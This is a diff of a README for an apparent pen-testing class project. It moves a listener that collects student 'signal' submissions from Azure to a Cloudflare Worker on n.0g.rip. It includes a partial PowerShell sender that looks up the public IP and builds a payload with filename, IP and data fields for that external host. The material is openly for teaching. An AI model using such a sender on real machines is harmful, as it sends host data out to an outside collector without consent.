@@ -1,6 +1,14 @@
-# Retro Hacker Lab Logger
+# The No Grip Elite Hackery Society
 
-This project deploys a lightweight Azure Web App that accepts student telemetry submissions and renders them in a retro hacker-themed table with timestamps.
+This project runs as a free Cloudflare Worker for the No Grip Elite Hackery Society signal intake.
+
+## Three live URLs
+
+- Landing page / instructions: https://n.0g.rip/
+- Student POST endpoint: https://n.0g.rip/
+- Dashboard: https://n.0g.rip/dashboard
+
+The root domain is intentionally the POST target because it is the simplest endpoint for students to send to during class.
 
 ## Required POST payload
 
@@ -11,10 +19,6 @@ The app will reject any request that does not include all of the following field
 - filename
 - public_ip
 - data
-
-The listener endpoint is:
-
-- POST /log
 
 Example payload:
 
@@ -28,33 +32,39 @@ Example payload:
 }
 ```
 
-## Azure deployment
+## Cloudflare deployment
 
-Use this link to deploy the app to Azure:
+1. Sign in to Cloudflare and create a Worker.
+2. In this project folder, run:
 
-https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2Fgrownuphacker%2FPen-Testing-Class%2Fmain%2Fazuredeploy.json
+```bash
+npm install
+npx wrangler login
+npx wrangler deploy
+```
+
+3. Configure the worker custom domain to point to https://n.0g.rip.
+4. Share the three URLs above with the class.
 
 ## Local development
 
 ```bash
 npm install
-npm start
+npm run dev
 ```
 
-Then POST to:
+Then test payloads against:
 
 ```text
-http://localhost:3000/log
+http://localhost:8787/
 ```
 
 ## Student-friendly sender example
 
-Use the provided [test-listener.ps1](test-listener.ps1) as a template. Replace the URL with your Azure site, then send the required payload.
-
-If you want a cleaner reusable version for class use, create or edit your own script and include the required keys:
+Use the provided [test-listener.ps1](test-listener.ps1) as a template and point it at the root domain.
 
 ```powershell
-$serviceUrl = "https://<your-student-lab>.azurewebsites.net/log"
+$serviceUrl = "https://n.0g.rip/"
 $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org").Trim()
 
 $payload = @{
